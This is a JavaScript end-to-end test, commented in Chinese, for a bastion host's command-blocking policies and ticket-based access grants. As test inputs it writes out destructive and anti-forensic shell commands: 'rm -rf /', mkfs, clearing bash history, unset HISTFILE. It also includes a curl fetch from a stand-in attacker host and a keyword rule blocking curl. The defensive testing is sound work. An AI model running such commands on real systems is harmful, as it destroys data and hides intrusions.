'use strict'
/**
 * 命令策略 + 工单授权 端到端测试
 *
 * 覆盖：
 *   A. 内置策略（19 条）列表/筛选/统计
 *   B. 命令判定的四种处置（allow/audit/confirm/deny）+ 空白归一化绕过
 *   C. 策略 CRUD、正则校验、引擎缓存失效
 *   D. 内置策略保护（不允许改匹配模式）
 *   E. 优先级覆盖
 *   F. 越权（三权分立：策略归安全管理员）
 *   G. 工单闭环：申请 → 审批 → 自动授权 → 撤销
 *   H. 紧急放行权限、驳回、取消
 *
 * 前置：数据库已重置、manager 已启动（BASTION_JWT_SECRET 已设置）
 * 用法：node e2e-policy.js
 */
const BASE = process.env.BASTION_BASE || 'http://127.0.0.1:8080'

let pass = 0, fail = 0
const results = []
const createdPolicyIDs = []

async function api(method, path, body, token) {
  const headers = { 'Content-Type': 'application/json' }
  if (token) headers['Authorization'] = 'Bearer ' + token
  const res = await fetch(BASE + path, { method, headers, body: body ? JSON.stringify(body) : undefined })
  let json = null
  try { json = await res.json() } catch (e) { }
  return { status: res.status, body: json }
}

function check(name, ok, detail) {
  if (ok) { pass++; console.log('  ✅ ' + name) }
  else { fail++; console.log('  ❌ ' + name + (detail ? '  → ' + detail : '')) }
  results.push({ name, ok, detail })
}

/** 命令测试助手：返回 decision */
async function testCmd(token, command, extra) {
  const r = await api('POST', '/api/v1/policies/command/test',
    Object.assign({ command }, extra || {}), token)
  return { status: r.status, d: r.body?.data?.decision, body: r.body }
}

async function main() {
  console.log('目标服务: ' + BASE + '\n')

  // ============ 0. 准备 ============
  console.log('【0】准备：初始化与账号')
  let r = await api('POST', '/api/v1/setup/init', {
    username: 'superadmin', password: 'Bastion@2025',
    display_name: '超级管理员', device_name: '堡垒机-策略工单测试',
  })
  check('初始化成功', r.status === 200, JSON.stringify(r.body).slice(0, 120))
  const setupToken = r.body?.data?.setup_token

  r = await api('POST', '/api/v1/setup/admins', {
    admins: [
      { role_code: 'sys_admin', username: 'sysadmin', password: 'Sys@Bastion2025', display_name: '系统管理员' },
      { role_code: 'sec_admin', username: 'secadmin', password: 'Sec@Bastion2025', display_name: '安全管理员' },
      { role_code: 'audit_admin', username: 'auditadmin', password: 'Aud@Bastion2025', display_name: '审计管理员' },
    ],
  }, setupToken)
  check('创建三员成功', r.status === 200, JSON.stringify(r.body).slice(0, 120))

  async function login(u, p) {
    const res = await api('POST', '/api/v1/auth/login', { username: u, password: p })
    return res.body?.data?.access_token
  }

  const sysToken = await login('sysadmin', 'Sys@Bastion2025')
  const secToken = await login('secadmin', 'Sec@Bastion2025')
  const auditToken = await login('auditadmin', 'Aud@Bastion2025')
  check('系统管理员登录', !!sysToken)
  check('安全管理员登录', !!secToken)
  check('审计管理员登录', !!auditToken)

  // 运维人员与审批人（三员之外的角色）
  r = await api('POST', '/api/v1/users', {
    username: 'ops01', display_name: '运维张三', password: 'Ops@Bastion2025', roles: ['operator'],
  }, sysToken)
  check('创建运维人员成功', r.status === 200 && !!r.body?.data?.user_id, JSON.stringify(r.body).slice(0, 150))
  const opsID = r.body?.data?.user_id

  r = await api('POST', '/api/v1/users', {
    username: 'approver01', display_name: '审批李四', password: 'App@Bastion2025', roles: ['approver'],
  }, sysToken)
  check('创建审批人成功', r.status === 200 && !!r.body?.data?.user_id, JSON.stringify(r.body).slice(0, 150))
  const approverID = r.body?.data?.user_id

  const opsToken = await login('ops01', 'Ops@Bastion2025')
  const appToken = await login('approver01', 'App@Bastion2025')
  check('运维人员登录', !!opsToken)
  check('审批人登录', !!appToken)

  // ============ 1. 内置策略 ============
  console.log('\n【1】内置命令策略')
  r = await api('GET', '/api/v1/policies/command?page_size=100', null, secToken)
  const allPolicies = r.body?.data?.items || []
  check('策略列表可查', r.status === 200 && r.body?.data?.total >= 19, 'total=' + r.body?.data?.total)
  check('内置策略全部标记 is_builtin', allPolicies.length > 0 && allPolicies.every(p => p.is_builtin === true))

  r = await api('GET', '/api/v1/policies/command?action=deny&page_size=100', null, secToken)
  const denyList = r.body?.data?.items || []
  check('按处置动作筛选（deny）', denyList.length > 0 && denyList.every(p => p.action === 'deny'), 'count=' + denyList.length)

  r = await api('GET', '/api/v1/policies/command?keyword=rm&page_size=100', null, secToken)
  check('按关键字搜索命中 rm 规则', (r.body?.data?.items || []).length >= 1)

  r = await api('GET', '/api/v1/policies/stats', null, secToken)
  const st = r.body?.data
  check('策略统计返回', r.status === 200 && st?.enabled_total >= 19, JSON.stringify(st))
  check('默认动作为 allow（非白名单模式）', st?.default_action === 'allow' && st?.whitelist_mode === false, JSON.stringify(st))
  check('引擎已加载规则', st?.engine_rules >= 19, 'engine_rules=' + st?.engine_rules)

  // ============ 2. 命令判定 ============
  console.log('\n【2】命令判定（核心安全能力）')
  let t = await testCmd(secToken, 'rm -rf /')
  check('rm -rf / 被阻断', t.d?.action === 'deny', JSON.stringify(t.d))
  check('命中规则带回显名称', !!t.d?.matched_rule?.name, JSON.stringify(t.d?.matched_rule || {}).slice(0, 120))
  check('风险等级为 critical', t.d?.risk_level === 'critical', 'risk=' + t.d?.risk_level)
  check('判定说明非空', !!t.d?.reason, t.d?.reason)

  t = await testCmd(secToken, 'rm    -rf    /')
  check('多空格变体同样被阻断（归一化生效）', t.d?.action === 'deny', JSON.stringify(t.d))
  check('归一化结果已折叠空白', !/\s{2,}/.test(t.body?.data?.normalized || ' '), JSON.stringify(t.body?.data?.normalized))
  check('命令名提取正确', t.body?.data?.command_name === 'rm', 'name=' + t.body?.data?.command_name)

  t = await testCmd(secToken, 'ls -la /tmp')
  check('普通命令放行', t.d?.action === 'allow' && t.d?.matched === false, JSON.stringify(t.d))

  t = await testCmd(secToken, 'shutdown -h now')
  check('shutdown 需二次确认', t.d?.action === 'confirm', JSON.stringify(t.d))
  check('确认超时时间已下发', (t.d?.timeout_seconds || 0) > 0, 'timeout=' + t.d?.timeout_seconds)
  check('需确认判定为 confirm', t.d?.action === 'confirm')

  t = await testCmd(secToken, 'useradd hacker')
  check('useradd 记录审计（放行+告警）', t.d?.action === 'audit', JSON.stringify(t.d))

  t = await testCmd(secToken, 'mkfs.ext4 /dev/sda1')
  check('mkfs 格式化被阻断', t.d?.action === 'deny', JSON.stringify(t.d))

  t = await testCmd(secToken, 'cat /etc/passwd')
  check('读取 /etc/passwd 不受影响（无误报）', t.d?.action === 'allow', JSON.stringify(t.d))

  t = await testCmd(secToken, 'grep useradd /var/log/secure')
  check('日志检索不受影响（无误报）', t.d?.action === 'allow', JSON.stringify(t.d))

  t = await testCmd(secToken, 'passwd root')
  check('passwd 改密命中告警', t.d?.action === 'audit', JSON.stringify(t.d))

  t = await testCmd(secToken, 'echo "" > ~/.bash_history')
  check('清空命令历史被阻断', t.d?.action === 'deny', JSON.stringify(t.d))

  t = await testCmd(secToken, 'unset HISTFILE')
  check('unset HISTFILE 被阻断', t.d?.action === 'deny', JSON.stringify(t.d))

  t = await testCmd(secToken, '')
  check('空命令被拒绝', t.status >= 400, 'status=' + t.status)

  // 适用范围：把某条规则限定到 core 资产，验证非 core 资产不命中
  t = await testCmd(secToken, 'shutdown -h now', { asset_level: 'core' })
  check('指定判定上下文可传资产级别', t.status === 200 && !!t.d?.action, JSON.stringify(t.d))

  // ============ 3. 策略 CRUD ============
  console.log('\n【3】策略增删改查')
  r = await api('POST', '/api/v1/policies/command', {
    policy_name: '禁止外联下载', policy_type: 'blacklist', match_type: 'keyword',
    pattern: 'curl', risk_level: 'warn', action: 'confirm', priority: 50,
    timeout_seconds: 15, remark: '禁止 curl 直连外网',
  }, secToken)
  check('创建自定义策略成功', r.status === 200 && !!r.body?.data?.policy_id, JSON.stringify(r.body).slice(0, 150))
  const pid = r.body?.data?.policy_id
  createdPolicyIDs.push(pid)
  check('新策略非内置', r.body?.data?.is_builtin === false)
  check('默认启用', r.body?.data?.enabled === true)

  r = await api('POST', '/api/v1/policies/command', {
    policy_name: '禁止外联下载', pattern: 'curl', action: 'deny',
  }, secToken)
  check('策略重名被拒绝', r.status >= 400, 'status=' + r.status)

  r = await api('POST', '/api/v1/policies/command', {
    policy_name: '非法动作策略', pattern: 'x', action: 'block',
  }, secToken)
  check('非法处置动作被拒绝', r.status >= 400, 'status=' + r.status)

  r = await api('POST', '/api/v1/policies/command', {
    policy_name: '非法正则策略', match_type: 'regex', pattern: '([', action: 'deny',
  }, secToken)
  check('非法正则被提前拦截', r.status >= 400, 'status=' + r.status)

  r = await api('POST', '/api/v1/policies/command', {
    policy_name: '空模式策略', action: 'deny',
  }, secToken)
  check('缺少匹配模式被拒绝', r.status >= 400, 'status=' + r.status)

  r = await api('GET', `/api/v1/policies/command/${pid}`, null, secToken)
  check('策略详情可查', r.status === 200 && r.body?.data?.policy_name === '禁止外联下载')
  check('优先级正确保存', r.body?.data?.priority === 50, 'priority=' + r.body?.data?.priority)
  check('超时时间正确保存', r.body?.data?.timeout_seconds === 15)

  // 引擎缓存失效：新建后立刻生效
  t = await testCmd(secToken, 'curl http://evil.example.com/x.sh')
  check('新策略立即生效（引擎缓存已失效）', t.d?.action === 'confirm', JSON.stringify(t.d))

  r = await api('PUT', `/api/v1/policies/command/${pid}`, {
    policy_name: '禁止外联下载', pattern: 'curl', action: 'deny', risk_level: 'danger',
  }, secToken)
  check('更新策略成功', r.status === 200, JSON.stringify(r.body).slice(0, 150))
  check('处置动作已更新为 deny', r.body?.data?.action === 'deny')
  t = await testCmd(secToken, 'curl http://evil.example.com/x.sh')
  check('更新后判定随之变化', t.d?.action === 'deny', JSON.stringify(t.d))

  r = await api('DELETE', `/api/v1/policies/command/${pid}`, null, secToken)
  check('删除策略成功', r.status === 200)
  r = await api('GET', `/api/v1/policies/command/${pid}`, null, secToken)
  check('删除后详情 404', r.status === 404, 'status=' + r.status)
  t = await testCmd(secToken, 'curl http://evil.example.com/x.sh')
  check('删除后命令恢复放行', t.d?.action === 'allow', JSON.stringify(t.d))

  // ============ 4. 内置策略保护 ============
  console.log('\n【4】内置策略保护')
  const builtin = allPolicies.find(p => p.action === 'deny' && p.is_builtin)
  check('存在内置阻断规则', !!builtin, 'count=' + allPolicies.length)
  if (builtin) {
    r = await api('PUT', `/api/v1/policies/command/${builtin.policy_id}`, {
      pattern: 'totally-different-pattern',
    }, secToken)
    check('内置策略禁止改匹配模式', r.status >= 400, 'status=' + r.status)

    r = await api('PUT', `/api/v1/policies/command/${builtin.policy_id}`, {
      action: 'audit', pattern: builtin.pattern,
    }, secToken)
    check('内置策略允许调整处置动作', r.status === 200 && r.body?.data?.action === 'audit', JSON.stringify(r.body).slice(0, 150))

    // 复原
    r = await api('PUT', `/api/v1/policies/command/${builtin.policy_id}`, {
      action: 'deny', pattern: builtin.pattern,
    }, secToken)
    check('内置策略动作可复原', r.status === 200 && r.body?.data?.action === 'deny')

    // 停用后不再命中
    r = await api('PUT', `/api/v1/policies/command/${builtin.policy_id}`, {
      enabled: false, action: 'deny', pattern: builtin.pattern,
    }, secToken)
    check('内置策略可停用', r.status === 200 && r.body?.data?.enabled === false)
    r = await api('PUT', `/api/v1/policies/command/${builtin.policy_id}`, {
      enabled: true, action: 'deny', pattern: builtin.pattern,
    }, secToken)
    check('内置策略可重新启用', r.status === 200 && r.body?.data?.enabled === true)
  }

  // ============ 5. 优先级覆盖 ============
  console.log('\n【5】优先级与规则覆盖')
  t = await testCmd(secToken, 'reboot')
  const beforeAction = t.d?.action
  r = await api('POST', '/api/v1/policies/command', {
    policy_name: '临时禁止重启', match_type: 'keyword', pattern: 'reboot',
    action: 'deny', risk_level: 'danger', priority: 1, remark: '优先级测试',
  }, secToken)
  check('创建高优先级策略', r.status === 200, JSON.stringify(r.body).slice(0, 150))
  const highPid = r.body?.data?.policy_id
  createdPolicyIDs.push(highPid)
  t = await testCmd(secToken, 'reboot')
  check('高优先级策略覆盖低优先级规则', beforeAction !== 'deny' && t.d?.action === 'deny',
    `before=${beforeAction} after=${t.d?.action}`)
  r = await api('DELETE', `/api/v1/policies/command/${highPid}`, null, secToken)
  check('清理优先级测试策略', r.status === 200)
  t = await testCmd(secToken, 'reboot')
  check('删除后恢复原判定', t.d?.action === beforeAction, `now=${t.d?.action}`)

  // ============ 6. 越权校验（三权分立）============
  console.log('\n【6】越权校验')
  r = await api('GET', '/api/v1/policies/command', null, auditToken)
  check('审计管理员不能查看命令策略', r.status === 403, 'status=' + r.status)
  r = await api('GET', '/api/v1/policies/command', null, sysToken)
  check('系统管理员不能查看命令策略', r.status === 403, 'status=' + r.status)
  r = await api('POST', '/api/v1/policies/command', {
    policy_name: '越权策略', pattern: 'x', action: 'deny',
  }, opsToken)
  check('运维人员不能创建策略', r.status === 403, 'status=' + r.status)
  r = await api('POST', '/api/v1/policies/command/test', { command: 'ls' }, opsToken)
  check('运维人员不能调用命令测试', r.status === 403, 'status=' + r.status)
  r = await api('GET', '/api/v1/policies/stats', null, auditToken)
  check('审计管理员不能查看策略统计', r.status === 403, 'status=' + r.status)

  // ============ 7. 工单闭环 ============
  console.log('\n【7】工单闭环：申请 → 审批 → 授权')
  r = await api('POST', '/api/v1/assets', {
    asset_name: 'db-prod-01', asset_type: 'host', protocol: 'ssh',
    host: '10.30.1.21', level: 'core', ostype: 'linux', remark: '工单测试资产',
  }, sysToken)
  check('准备资产成功', r.status === 200 && !!r.body?.data?.asset_id, JSON.stringify(r.body).slice(0, 150))
  const assetID = r.body?.data?.asset_id

  r = await api('POST', `/api/v1/assets/${assetID}/accounts`, {
    account_name: 'root', account_type: 'password', password: 'Root@Core2025!', privileged: true,
  }, sysToken)
  check('准备托管账号成功', r.status === 200 && !!r.body?.data?.account_id, JSON.stringify(r.body).slice(0, 150))
  const accountID = r.body?.data?.account_id

  r = await api('POST', '/api/v1/tickets', {
    title: '生产数据库巡检', reason: '月度巡检，需要登录核心库检查慢查询',
    ticket_type: 'access', priority: 'normal', valid_hours: 2,
    items: [{ asset_id: assetID, account_id: accountID }],
  }, opsToken)
  check('运维提交工单成功', r.status === 200 && !!r.body?.data?.ticket_id, JSON.stringify(r.body).slice(0, 200))
  const ticketID = r.body?.data?.ticket_id
  const ticketNo = r.body?.data?.ticket_no
  check('工单号自动生成', !!ticketNo, 'no=' + ticketNo)
  check('工单初始状态为待审批', r.body?.data?.status === 'pending', 'status=' + r.body?.data?.status)
  check('申请人记录为当前用户', r.body?.data?.applicant_id === opsID, `applicant=${r.body?.data?.applicant_id} ops=${opsID}`)
  check('有效期已计算', !!r.body?.data?.valid_to, r.body?.data?.valid_to)
  check('工单明细含资产名', (r.body?.data?.items || [])[0]?.asset_name === 'db-prod-01',
    JSON.stringify(r.body?.data?.items || []).slice(0, 150))

  r = await api('POST', '/api/v1/tickets', { title: '无明细工单', reason: 'x', items: [] }, opsToken)
  check('无资产明细被拒绝', r.status >= 400, 'status=' + r.status)
  r = await api('POST', '/api/v1/tickets', { reason: '无标题' }, opsToken)
  check('无标题被拒绝', r.status >= 400, 'status=' + r.status)

  r = await api('GET', '/api/v1/tickets', null, opsToken)
  check('运维只能看到自己的工单', r.body?.data?.total === 1, 'total=' + r.body?.data?.total)

  r = await api('GET', '/api/v1/tickets?status=pending', null, appToken)
  check('审批人可见全部待审批工单', (r.body?.data?.total || 0) >= 1, 'total=' + r.body?.data?.total)

  r = await api('GET', '/api/v1/grants/my', null, opsToken)
  check('审批前运维无授权', (r.body?.data?.items || []).length === 0, JSON.stringify(r.body?.data).slice(0, 150))

  r = await api('POST', `/api/v1/tickets/${ticketID}/reject`, { comment: '先补巡检方案' }, appToken)
  check('驳回需可先测试（此处应成功）', r.status === 200 && r.body?.data?.status === 'rejected', JSON.stringify(r.body).slice(0, 150))

  // 重新提一张用于完整闭环
  r = await api('POST', '/api/v1/tickets', {
    title: '生产数据库巡检（第二次）', reason: '已补巡检方案',
    valid_hours: 2, items: [{ asset_id: assetID, account_id: accountID }],
  }, opsToken)
  const ticket2 = r.body?.data?.ticket_id
  check('二次提交工单成功', r.status === 200 && !!ticket2)

  r = await api('POST', `/api/v1/tickets/${ticket2}/approve`, { comment: '同意' }, opsToken)
  check('运维人员不能审批工单', r.status === 403, 'status=' + r.status)

  r = await api('POST', `/api/v1/tickets/${ticket2}/reject`, { comment: '' }, appToken)
  check('驳回必须填写意见', r.status >= 400, 'status=' + r.status)

  r = await api('POST', `/api/v1/tickets/${ticket2}/approve`, { comment: '同意，注意操作窗口' }, appToken)
  check('审批通过成功', r.status === 200, JSON.stringify(r.body).slice(0, 200))
  check('工单状态变为已通过', r.body?.data?.ticket?.status === 'approved', 'status=' + r.body?.data?.ticket?.status)

  r = await api('GET', `/api/v1/tickets/${ticket2}`, null, appToken)
  check('工单详情含审批记录', (r.body?.data?.records || []).length >= 1,
    JSON.stringify(r.body?.data?.records || []).slice(0, 200))

  r = await api('GET', '/api/v1/grants/my', null, opsToken)
  const grants = r.body?.data?.items || []
  check('审批后自动生成授权', grants.length === 1, 'grants=' + grants.length)
  check('授权指向正确资产', grants[0]?.asset_id === assetID, JSON.stringify(grants[0] || {}).slice(0, 200))
  check('授权来源为工单', grants[0]?.grant_source === 'ticket', 'source=' + grants[0]?.grant_source)
  check('授权允许登录', grants[0]?.can_login === true)
  check('授权默认禁止复制粘贴', grants[0]?.can_copy === false && grants[0]?.can_paste === false)
  check('授权状态为 active', grants[0]?.status === 'active', 'status=' + grants[0]?.status)

  r = await api('POST', `/api/v1/tickets/${ticket2}/approve`, { comment: '重复审批' }, appToken)
  check('已通过工单不能重复审批', r.status >= 400, 'status=' + r.status)

  // 越权查看他人工单
  r = await api('GET', `/api/v1/tickets/${ticket2}`, null, auditToken)
  check('审计管理员可查看全部工单', r.status === 200, 'status=' + r.status)

  // ============ 8. 授权撤销 ============
  console.log('\n【8】授权撤销')
  r = await api('POST', `/api/v1/tickets/${ticket2}/revoke-grants`, null, appToken)
  check('撤销工单授权成功', r.status === 200 && r.body?.data?.revoked_grants === 1,
    JSON.stringify(r.body?.data))

  r = await api('GET', '/api/v1/grants/my', null, opsToken)
  const after = (r.body?.data?.items || []).filter(g => g.status === 'active')
  check('撤销后不再有有效授权', after.length === 0, JSON.stringify(r.body?.data?.items || []).slice(0, 200))

  // ============ 9. 紧急放行与取消 ============
  console.log('\n【9】紧急放行与工单取消')
  r = await api('POST', '/api/v1/tickets', {
    title: '紧急故障处理', reason: '线上数据库不可用', is_emergency: true,
    emergency_note: 'P0 故障，先处理后补单', items: [{ asset_id: assetID }],
  }, opsToken)
  check('运维无紧急放行权限被拒', r.status === 403, 'status=' + r.status)

  r = await api('POST', '/api/v1/tickets', {
    title: '紧急故障处理', reason: '线上数据库不可用', is_emergency: true,
    emergency_note: 'P0 故障，先处理后补单', items: [{ asset_id: assetID }],
  }, appToken)
  check('审批人可紧急放行', r.status === 200, JSON.stringify(r.body).slice(0, 200))
  check('紧急工单状态为待补单', r.body?.data?.status === 'supplement', 'status=' + r.body?.data?.status)
  const emergencyTicket = r.body?.data?.ticket_id

  r = await api('GET', '/api/v1/grants/my', null, appToken)
  check('紧急放行立即生成授权', (r.body?.data?.items || []).length === 1, JSON.stringify(r.body?.data).slice(0, 150))

  r = await api('POST', '/api/v1/tickets', {
    title: '待取消工单', reason: '测试取消', items: [{ asset_id: assetID }],
  }, opsToken)
  const cancelTicket = r.body?.data?.ticket_id
  check('创建待取消工单', r.status === 200 && !!cancelTicket)
  r = await api('POST', `/api/v1/tickets/${cancelTicket}/cancel`, null, opsToken)
  check('申请人可取消自己的工单', r.status === 200, JSON.stringify(r.body).slice(0, 150))
  r = await api('GET', `/api/v1/tickets/${cancelTicket}`, null, opsToken)
  check('取消后状态为已取消', r.body?.data?.status === 'cancelled', 'status=' + r.body?.data?.status)
  r = await api('POST', `/api/v1/tickets/${cancelTicket}/cancel`, null, opsToken)
  check('已取消工单不能重复取消', r.status >= 400, 'status=' + r.status)

  r = await api('POST', `/api/v1/tickets/${emergencyTicket}/cancel`, null, appToken)
  check('紧急放行工单不可取消', r.status >= 400, 'status=' + r.status)

  // ============ 10. 统计与日志 ============
  console.log('\n【10】统计')
  r = await api('GET', '/api/v1/tickets/stats', null, appToken)
  const ts = r.body?.data
  check('工单统计可查', r.status === 200 && ts?.total >= 4, JSON.stringify(ts))
  check('统计含状态分布', !!ts?.by_status && Object.keys(ts.by_status).length >= 3, JSON.stringify(ts?.by_status))
  check('统计含有效授权数', typeof ts?.active_grants === 'number', 'active_grants=' + ts?.active_grants)

  r = await api('GET', '/api/v1/tickets/stats', null, opsToken)
  check('运维不能查看全局工单统计', r.status === 403, 'status=' + r.status)

  r = await api('GET', '/api/v1/policies/stats', null, secToken)
  check('策略统计最终可查', r.status === 200 && r.body?.data?.enabled_total >= 19, JSON.stringify(r.body?.data))

  // 清理自定义策略
  for (const id of createdPolicyIDs) {
    await api('DELETE', `/api/v1/policies/command/${id}`, null, secToken)
  }

  console.log('\n' + '='.repeat(56))
  console.log(`通过 ${pass} 项，失败 ${fail} 项`)
  console.log('='.repeat(56))
  if (fail > 0) {
    console.log('\n失败明细：')
    results.filter(x => !x.ok).forEach(x => console.log('  - ' + x.name + (x.detail ? '  → ' + x.detail : '')))
    process.exit(1)
  }
}

main().catch(e => { console.error('测试异常中断:', e); process.exit(1) })
